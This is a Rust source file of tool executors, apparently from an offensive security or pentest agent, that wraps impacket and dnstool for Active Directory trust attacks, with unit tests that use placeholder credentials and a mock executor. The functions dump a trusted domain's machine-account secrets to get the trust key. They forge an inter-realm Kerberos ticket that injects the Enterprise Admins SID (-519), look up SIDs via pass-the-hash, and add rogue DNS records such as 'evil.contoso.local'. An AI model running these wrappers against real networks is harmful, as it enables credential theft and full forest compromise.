//! Trust / cross-forest tool executors.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Extract trust keys by dumping secrets for a trusted domain's machine account.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `trusted_domain`
pub async fn extract_trust_key(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let trusted_domain = required_str(args, "trusted_domain")?;

    let (target_str, extra_args) =
        credentials::impacket_auth(Some(domain), username, Some(password), None, dc_ip);

    let just_dc_user = format!("{trusted_domain}$");

    CommandBuilder::new("impacket-secretsdump")
        .arg(target_str)
        .args(extra_args)
        .flag("-just-dc-user", just_dc_user)
        .timeout_secs(120)
        .execute()
        .await
}

/// Create an inter-realm / cross-forest Kerberos ticket using impacket-ticketer.
///
/// Required args: `trust_key`, `source_sid`, `source_domain`, `target_sid`,
///                `target_domain`
/// Optional args: `username`
pub async fn create_inter_realm_ticket(args: &Value) -> Result<ToolOutput> {
    let trust_key = required_str(args, "trust_key")?;
    let source_sid = required_str(args, "source_sid")?;
    let source_domain = required_str(args, "source_domain")?;
    let target_sid = required_str(args, "target_sid")?;
    let target_domain = required_str(args, "target_domain")?;
    let username = optional_str(args, "username").unwrap_or("Administrator");

    let extra_sid = format!("{target_sid}-519");
    let spn = format!("krbtgt/{target_domain}");

    CommandBuilder::new("impacket-ticketer")
        .flag("-nthash", trust_key)
        .flag("-domain-sid", source_sid)
        .flag("-domain", source_domain)
        .flag("-extra-sid", extra_sid)
        .flag("-spn", spn)
        .arg(username)
        .timeout_secs(120)
        .execute()
        .await
}

/// Look up domain SIDs using impacket-lookupsid.
///
/// Required args: `domain`, `username`, `dc_ip`
/// Auth: `password` (plaintext) OR `hash` (NTLM pass-the-hash). At least one required.
pub async fn get_sid(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = args
        .get("password")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty());
    let hash = args
        .get("hash")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty());
    let dc_ip = required_str(args, "dc_ip")?;

    if password.is_none() && hash.is_none() {
        anyhow::bail!("get_sid requires either 'password' or 'hash' for authentication");
    }

    let (target_str, extra_args) =
        credentials::impacket_auth(Some(domain), username, password, hash, dc_ip);

    CommandBuilder::new("impacket-lookupsid")
        .arg(target_str)
        .args(extra_args)
        .timeout_secs(120)
        .execute()
        .await
}

/// Manage DNS records using dnstool.py.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `record_name`,
///                `record_data`
/// Optional args: `action` (defaults to "add")
pub async fn dnstool(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let record_name = required_str(args, "record_name")?;
    let record_data = required_str(args, "record_data")?;
    let action = optional_str(args, "action").unwrap_or("add");

    let user_spec = format!("{domain}\\{username}");

    CommandBuilder::new("dnstool")
        .flag("-dc-ip", dc_ip)
        .flag("-u", user_spec)
        .flag("-p", password)
        .flag("-a", action)
        .flag("-r", record_name)
        .flag("-d", record_data)
        .arg(dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_str, required_str};
    use serde_json::json;

    // --- extract_trust_key ---

    #[test]
    fn extract_trust_key_missing_trusted_domain() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "trusted_domain").is_err());
    }

    #[test]
    fn extract_trust_key_missing_dc_ip() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "trusted_domain": "child.contoso.local"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn extract_trust_key_just_dc_user_format() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "trusted_domain": "child.contoso.local"
        });
        let trusted_domain = required_str(&args, "trusted_domain").unwrap();
        let just_dc_user = format!("{trusted_domain}$");
        assert_eq!(just_dc_user, "child.contoso.local$");
    }

    // --- create_inter_realm_ticket ---

    #[test]
    fn create_inter_realm_ticket_missing_trust_key() {
        let args = json!({
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local"
        });
        assert!(required_str(&args, "trust_key").is_err());
    }

    #[test]
    fn create_inter_realm_ticket_missing_source_sid() {
        let args = json!({
            "trust_key": "aabbccdd",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local"
        });
        assert!(required_str(&args, "source_sid").is_err());
    }

    #[test]
    fn create_inter_realm_ticket_extra_sid_format() {
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local"
        });
        let target_sid = required_str(&args, "target_sid").unwrap();
        let extra_sid = format!("{target_sid}-519");
        assert_eq!(extra_sid, "S-1-5-21-222-519");
    }

    #[test]
    fn create_inter_realm_ticket_spn_format() {
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local"
        });
        let target_domain = required_str(&args, "target_domain").unwrap();
        let spn = format!("krbtgt/{target_domain}");
        assert_eq!(spn, "krbtgt/contoso.local");
    }

    #[test]
    fn create_inter_realm_ticket_username_default() {
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local"
        });
        let username = optional_str(&args, "username").unwrap_or("Administrator");
        assert_eq!(username, "Administrator");
    }

    #[test]
    fn create_inter_realm_ticket_username_custom() {
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local",
            "username": "fakeuser"
        });
        let username = optional_str(&args, "username").unwrap_or("Administrator");
        assert_eq!(username, "fakeuser");
    }

    // --- get_sid ---

    #[test]
    fn get_sid_missing_domain() {
        let args = json!({
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn get_sid_missing_username() {
        let args = json!({
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn get_sid_missing_password_and_hash() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::get_sid(&args));
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("get_sid requires either 'password' or 'hash'"));
    }

    #[test]
    fn get_sid_empty_password_and_hash_still_errors() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10",
            "password": "",
            "hash": ""
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::get_sid(&args));
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("get_sid requires either 'password' or 'hash'"));
    }

    #[test]
    fn get_sid_with_password_present() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let password = args
            .get("password")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty());
        assert_eq!(password, Some("P@ssw0rd!"));
    }

    #[test]
    fn get_sid_with_hash_present() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "dc_ip": "192.168.58.10"
        });
        let hash = args
            .get("hash")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty());
        assert_eq!(hash, Some("31d6cfe0d16ae931b73c59d7e0c089c0"));
    }

    // --- dnstool ---

    #[test]
    fn dnstool_missing_record_name() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "record_data": "192.168.58.99"
        });
        assert!(required_str(&args, "record_name").is_err());
    }

    #[test]
    fn dnstool_missing_record_data() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "record_name": "evil.contoso.local"
        });
        assert!(required_str(&args, "record_data").is_err());
    }

    #[test]
    fn dnstool_action_default_add() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "record_name": "evil.contoso.local",
            "record_data": "192.168.58.99"
        });
        let action = optional_str(&args, "action").unwrap_or("add");
        assert_eq!(action, "add");
    }

    #[test]
    fn dnstool_action_custom() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "record_name": "evil.contoso.local",
            "record_data": "192.168.58.99",
            "action": "remove"
        });
        let action = optional_str(&args, "action").unwrap_or("add");
        assert_eq!(action, "remove");
    }

    #[test]
    fn dnstool_user_spec_format() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "record_name": "evil.contoso.local",
            "record_data": "192.168.58.99"
        });
        let domain = required_str(&args, "domain").unwrap();
        let username = required_str(&args, "username").unwrap();
        let user_spec = format!("{domain}\\{username}");
        assert_eq!(user_spec, "contoso.local\\admin");
    }

    // --- mock executor tests ---

    use super::*;
    use crate::executor::mock;

    #[tokio::test]
    async fn extract_trust_key_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "trusted_domain": "child.contoso.local"
        });
        assert!(extract_trust_key(&args).await.is_ok());
    }

    #[tokio::test]
    async fn create_inter_realm_ticket_executes() {
        mock::push(mock::success());
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local"
        });
        assert!(create_inter_realm_ticket(&args).await.is_ok());
    }

    #[tokio::test]
    async fn create_inter_realm_ticket_with_username_executes() {
        mock::push(mock::success());
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local",
            "username": "fakeuser"
        });
        assert!(create_inter_realm_ticket(&args).await.is_ok());
    }

    #[tokio::test]
    async fn get_sid_with_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(get_sid(&args).await.is_ok());
    }

    #[tokio::test]
    async fn get_sid_with_hash_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "dc_ip": "192.168.58.10"
        });
        assert!(get_sid(&args).await.is_ok());
    }

    #[tokio::test]
    async fn dnstool_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "record_name": "evil.contoso.local",
            "record_data": "192.168.58.99"
        });
        assert!(dnstool(&args).await.is_ok());
    }

    #[tokio::test]
    async fn dnstool_with_action_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "record_name": "evil.contoso.local",
            "record_data": "192.168.58.99",
            "action": "remove"
        });
        assert!(dnstool(&args).await.is_ok());
    }
}
